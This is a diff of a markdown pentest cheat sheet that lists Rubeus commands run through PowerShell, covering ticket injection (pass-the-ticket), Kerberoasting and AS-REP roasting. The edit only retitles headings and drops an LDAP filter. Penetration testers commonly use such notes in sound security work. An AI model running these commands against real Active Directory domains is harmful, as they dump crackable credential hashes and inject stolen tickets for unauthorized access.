@@ -51,12 +51,12 @@ Invoke-Rubeus -Command 'createnetonly /program:C:\Windows\System32\cmd.exe /show
 Invoke-Rubeus -Command 'ptt /luid:<luid> /ticket:<base64>'
 ```
 
-### Kerberoasting using john format
+### Kerberoasting
 ```
-Invoke-Rubeus -Command 'kerberoast /outfile:<file>.txt /ldapfilter:"admincount=1"'
+Invoke-Rubeus -Command 'kerberoast /outfile:<file>.txt'
 ```
 
-### Asrep roasting using john format 
+### Asrep roasting
 ```
 Invoke-Rubeus -Command 'asreproast /outfile:<file>.txt '
 ```
